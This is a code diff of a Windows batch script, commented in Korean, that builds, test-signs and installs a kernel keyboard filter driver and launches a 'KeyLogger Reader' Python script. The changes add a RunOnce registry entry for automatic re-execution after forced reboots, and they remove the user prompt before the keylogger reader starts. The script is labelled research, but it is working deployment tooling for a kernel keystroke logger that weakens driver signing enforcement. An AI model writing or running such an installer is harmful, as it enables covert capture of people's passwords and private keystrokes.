@@ -39,13 +39,12 @@ if not errorlevel 1 (
         call :fail "활성화 실패 -- VM 설정에서 Secure Boot 를 꺼주세요"
         pause & exit /b 1
     )
-    call :ok "활성화 완료"
-    echo.
-    echo  [!] 테스트 서명 모드 적용을 위해 재부팅이 필요합니다.
-    echo      재부팅 후 setup.bat 를 다시 실행하세요.
-    echo.
-    pause
-    shutdown /r /t 5 /c "testsigning 적용을 위한 재부팅"
+    call :ok "활성화 완료 -- 재부팅 후 자동 재실행"
+    :: 재부팅 후 이 스크립트를 자동 실행하도록 레지스트리 등록
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ^
+        /v "KeyLoggerSetup" /t REG_SZ ^
+        /d "cmd /c \"%~f0\"" /f >nul 2>&1
+    shutdown /r /t 5 /c "testsigning 적용을 위한 재부팅 (5초 후)"
     exit /b 0
 )
 
@@ -65,7 +64,6 @@ if errorlevel 1 (
     call :fail "Python 설치 실패 -- https://python.org 에서 수동 설치 후 재실행"
     pause & exit /b 1
 )
-:: PATH 갱신
 set "PATH=%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts;%PATH%"
 python --version >nul 2>&1
 if errorlevel 1 (
@@ -91,14 +89,17 @@ if errorlevel 1 (
 call :ok "Python 모듈 검증 완료"
 
 :: ────────────────────────────────────────────────────────────────
-:: STEP 4: Visual Studio 2022 BuildTools 확인 및 자동 설치
+:: STEP 4: Visual Studio 2022 + WDK 자동 설치
 :: ────────────────────────────────────────────────────────────────
 call :step 4 8 "Visual Studio 2022 + WDK 확인 및 설치"
 
+:: VS2022 확인 및 자동 설치
 call :find_msbuild
 if not defined MSBUILD (
     echo         VS2022 없음 -- winget 으로 자동 설치 중... (수분 소요)
-    winget install -e --id Microsoft.VisualStudio.2022.BuildTools --silent --accept-package-agreements --accept-source-agreements --override "--quiet --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"
+    winget install -e --id Microsoft.VisualStudio.2022.BuildTools --silent ^
+        --accept-package-agreements --accept-source-agreements ^
+        --override "--quiet --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"
     if errorlevel 1 (
         call :fail "VS2022 설치 실패 -- https://aka.ms/vs/17/release/vs_buildtools.exe 수동 설치"
         pause & exit /b 1
@@ -111,40 +112,71 @@ if not defined MSBUILD (
 )
 call :ok "MSBuild 발견"
 
-:: WDK VS 통합 확인 (WindowsKernelModeDriver10.0 툴셋 등록 여부)
-set WDK_VS_OK=0
-for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
-    for %%e in (Community Professional Enterprise BuildTools) do (
-        if exist "%%~p\Microsoft Visual Studio\2022\%%e\MSBuild\Microsoft\WindowsDriver\" (
-            set WDK_VS_OK=1
-        )
-    )
-)
+:: WDK VS 통합 확인 (WindowsKernelModeDriver10.0 툴셋 존재 여부)
+call :check_wdk_vs
 if "!WDK_VS_OK!"=="1" (
     call :ok "WDK VS 통합 발견"
-) else (
-    echo         WDK VS 통합 없음 -- 공식 설치 파일 다운로드 중... (수분 소요)
-    set "WDK_SETUP=%TEMP%\wdksetup.exe"
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://go.microsoft.com/fwlink/?linkid=2272234' -OutFile '%TEMP%\wdksetup.exe' -UseBasicParsing"
-    if exist "%TEMP%\wdksetup.exe" (
-        "%TEMP%\wdksetup.exe" /quiet /norestart
-        call :ok "WDK + VS 통합 설치 완료"
-    ) else (
-        call :warn "WDK 다운로드 실패 -- 수동 설치 후 재실행"
-        echo         수동 설치: https://learn.microsoft.com/windows-hardware/drivers/download-the-wdk
-    )
+    goto :build
 )
+
+:: WDK 없음 → 자동 설치
+echo         WDK 없음 -- 자동 설치 시작...
+
+:: 1) wdksetup.exe 다운로드
+set "WDK_SETUP=%TEMP%\wdksetup.exe"
+echo         WDK 다운로드 중... (수분 소요)
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Invoke-WebRequest -Uri 'https://go.microsoft.com/fwlink/?linkid=2272234' -OutFile '%WDK_SETUP%' -UseBasicParsing"
+if not exist "%WDK_SETUP%" (
+    call :fail "WDK 다운로드 실패 -- 네트워크 확인 후 재실행"
+    pause & exit /b 1
+)
+
+:: 2) WDK 설치 (무인 설치)
+echo         WDK 설치 중... (수분 소요)
+"%WDK_SETUP%" /quiet /norestart
+del /f /q "%WDK_SETUP%" >nul 2>&1
+
+:: 3) WDK.vsix → VSIXInstaller 로 VS2022 통합 (WindowsKernelModeDriver10.0 등록)
+echo         WDK VS2022 통합 설치 중...
+call :install_wdk_vsix
+
+:: 4) 재확인
+call :check_wdk_vs
+if "!WDK_VS_OK!"=="1" (
+    call :ok "WDK + VS 통합 설치 완료"
+    goto :build
+)
+
+:: 통합이 아직 안 됐으면 재부팅 필요 (레지스트리에 자동 재실행 등록 후 재부팅)
+call :warn "WDK 설치 완료 -- VS 통합 적용을 위해 재부팅 필요"
+echo         재부팅 후 자동으로 setup.bat 재실행됩니다. (5초 후 재부팅)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" ^
+    /v "KeyLoggerSetup" /t REG_SZ ^
+    /d "cmd /c \"%~f0\"" /f >nul 2>&1
+timeout /t 5 /nobreak >nul
+shutdown /r /t 0 /c "WDK VS 통합 적용을 위한 재부팅"
+exit /b 0
 
 :: ────────────────────────────────────────────────────────────────
 :: STEP 5: 드라이버 빌드
 :: ────────────────────────────────────────────────────────────────
+:build
 call :step 5 8 "드라이버 빌드"
 if not exist "%DRIVER_SRC%\KeyFilter.vcxproj" (
     call :fail "KeyFilter.vcxproj 없음: %DRIVER_SRC%"
     pause & exit /b 1
 )
 
-"%MSBUILD%" "%DRIVER_SRC%\KeyFilter.vcxproj" /p:Configuration=Release /p:Platform=x64 /nologo /verbosity:minimal /p:OutDir="%DRIVER_SRC%\bin\\" 2>&1 | findstr /i "error warning"
+if exist "%DRIVER_SYS%" (
+    call :ok "기존 KeyFilter.sys 사용 (빌드 건너뜀)"
+    goto :sign
+)
+
+"%MSBUILD%" "%DRIVER_SRC%\KeyFilter.vcxproj" ^
+    /p:Configuration=Release /p:Platform=x64 ^
+    /nologo /verbosity:minimal ^
+    /p:OutDir="%DRIVER_SRC%\bin\\" 2>&1 | findstr /i "error warning"
 
 if not exist "%DRIVER_SRC%\bin\KeyFilter.sys" (
     call :fail "빌드 실패 -- 위 오류 메시지를 확인하세요"
@@ -156,6 +188,7 @@ call :ok "KeyFilter.sys 생성 완료"
 :: ────────────────────────────────────────────────────────────────
 :: STEP 6: 드라이버 서명
 :: ────────────────────────────────────────────────────────────────
+:sign
 call :step 6 8 "드라이버 서명 (테스트 인증서)"
 
 set MAKECERT=
@@ -174,10 +207,14 @@ if not defined MAKECERT (
 
 certutil -store PrivateCertStore "%CERT_NAME%" >nul 2>&1
 if errorlevel 1 (
-    "%MAKECERT%" -r -pe -ss root -sr localMachine -n "CN=%CERT_NAME% Root" -eku 1.3.6.1.5.5.7.3.3 "%ROOT%%CERT_NAME%Root.cer" >nul 2>&1
-    "%MAKECERT%" -pe -ss PrivateCertStore -n "CN=%CERT_NAME%" -eku 1.3.6.1.5.5.7.3.3 -is root -ir localMachine -in "%CERT_NAME% Root" "%ROOT%%CERT_NAME%.cer" >nul 2>&1
+    "%MAKECERT%" -r -pe -ss root -sr localMachine -n "CN=%CERT_NAME% Root" ^
+        -eku 1.3.6.1.5.5.7.3.3 "%ROOT%%CERT_NAME%Root.cer" >nul 2>&1
+    "%MAKECERT%" -pe -ss PrivateCertStore -n "CN=%CERT_NAME%" ^
+        -eku 1.3.6.1.5.5.7.3.3 -is root -ir localMachine ^
+        -in "%CERT_NAME% Root" "%ROOT%%CERT_NAME%.cer" >nul 2>&1
 )
-"%SIGNTOOL%" sign /s PrivateCertStore /n "%CERT_NAME%" /fd sha256 /t http://timestamp.digicert.com "%DRIVER_SYS%" >nul 2>&1
+"%SIGNTOOL%" sign /s PrivateCertStore /n "%CERT_NAME%" /fd sha256 ^
+    /t http://timestamp.digicert.com "%DRIVER_SYS%" >nul 2>&1
 if errorlevel 1 (
     call :warn "서명 실패 -- 계속 진행"
 ) else (
@@ -198,7 +235,8 @@ if not errorlevel 1 (
     timeout /t 1 /nobreak >nul
 )
 
-sc create %SERVICE% type= kernel start= demand binPath= "%DRIVER_SYS%" DisplayName= "Keyboard Filter (Research)" >nul 2>&1
+sc create %SERVICE% type= kernel start= demand binPath= "%DRIVER_SYS%" ^
+    DisplayName= "Keyboard Filter (Research)" >nul 2>&1
 if errorlevel 1 (
     call :fail "sc create 실패"
     pause & exit /b 1
@@ -249,18 +287,28 @@ echo      sc delete KeyFilter
 echo  =========================================
 echo.
 
-set /p GORUN="지금 바로 reader.py 실행? [Y/N]: "
-if /i "!GORUN!"=="Y" (
-    start "KeyLogger Reader" cmd /k "cd /d %ROOT% && python reader\reader.py"
-)
+start "KeyLogger Reader" cmd /k "cd /d %ROOT% && python reader\reader.py"
 pause
 goto :eof
 
 :: ────────────────────────────────────────────────────────────────
 :: 도우미 함수
 :: ────────────────────────────────────────────────────────────────
+
+:: WDK VS 통합 여부 확인 → WDK_VS_OK 설정
+:check_wdk_vs
+set WDK_VS_OK=0
+for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
+    for %%e in (Community Professional Enterprise BuildTools) do (
+        if exist "%%~p\Microsoft Visual Studio\2022\%%e\MSBuild\Microsoft\WindowsDriver\" (
+            set WDK_VS_OK=1
+        )
+    )
+)
+goto :eof
+
+:: WDK.vsix 를 VSIXInstaller 로 VS2022 에 통합
 :install_wdk_vsix
-:: WDK VS2022 통합 VSIX 적용 (WindowsKernelModeDriver10.0 플랫폼 도구 집합 등록)
 set VSIXINSTALLER=
 for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
     for %%e in (Community Professional Enterprise BuildTools) do (
@@ -281,19 +329,17 @@ if not defined WDK_VSIX (
     call :warn "WDK.vsix 없음 -- WDK VS 통합 건너뜀"
     goto :eof
 )
-echo         WDK VS2022 통합 VSIX 설치 중...
 "%VSIXINSTALLER%" /q "%WDK_VSIX%" >nul 2>&1
 call :ok "WDK VS 통합 완료 (WindowsKernelModeDriver10.0)"
 goto :eof
 
+:: MSBuild.exe 경로 탐색 → MSBUILD 설정
 :find_msbuild
 set MSBUILD=
-:: 1) vswhere.exe (VS 설치 시 자동 포함되는 공식 탐색 도구)
 set VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe
 if exist "%VSWHERE%" (
     for /f "usebackq delims=" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe 2^>nul`) do set "MSBUILD=%%i"
 )
-:: 2) 수동 경로 탐색 (x64 및 x86 모두)
 if not defined MSBUILD (
     for %%p in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
         for %%e in (Community Professional Enterprise BuildTools) do (
